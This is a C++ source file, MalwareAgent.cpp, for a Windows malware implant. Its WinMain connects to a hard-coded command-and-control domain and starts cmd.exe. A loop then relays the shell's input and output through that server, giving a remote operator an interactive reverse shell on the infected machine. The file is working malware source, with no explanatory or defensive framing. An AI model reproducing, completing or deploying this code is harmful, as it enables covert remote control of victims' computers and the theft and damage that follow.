// MalwareAgent.cpp : définit le point d'entrée de l'application.
//

#include "WinAgent.h"
#include "subprocess.h"
#include <vector>
#include "crypto.h"

#define SEND_BUFFER_LENGTH 22

using namespace std;

void runSubprocess(C2 c2, string command) {
	Subprocess shell = Subprocess(command);
	BYTE sendBuffer[SEND_BUFFER_LENGTH];
	string welcomeString = "New process PID " + to_string(shell.getProcessId()) + "\n";
	const char* welcome = welcomeString.c_str();
	vector<BYTE> response = c2.query(vector<BYTE>(welcome, welcome + strlen(welcome)), true);
	bool poll = false;
	while (true) {
		bool sleep = true;
		if (response.size()) {
			shell.write(&response[0], response.size());
			Sleep(10);
			sleep = false;
		}
		size_t read = 0;
		read = shell.read(sendBuffer, SEND_BUFFER_LENGTH);
		if (read > 0 || poll) {
			response = c2.query(vector<BYTE>(sendBuffer, sendBuffer + read), true);
			sleep = false;
			poll = false;
		}

		if (!shell.isAlive()) break;
		if (sleep) {
			Sleep(1000);
			poll = true;
		}
	}
	const char* bye = "Process has exited.";
	c2.query(vector<BYTE>(bye, bye + strlen(bye)), true);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow) {
	C2 c2 = C2("cxu5zdk80j3rtqqm1xk5nikxitq2ub.xyz");
	runSubprocess(c2, "cmd.exe");
	return 0;
}
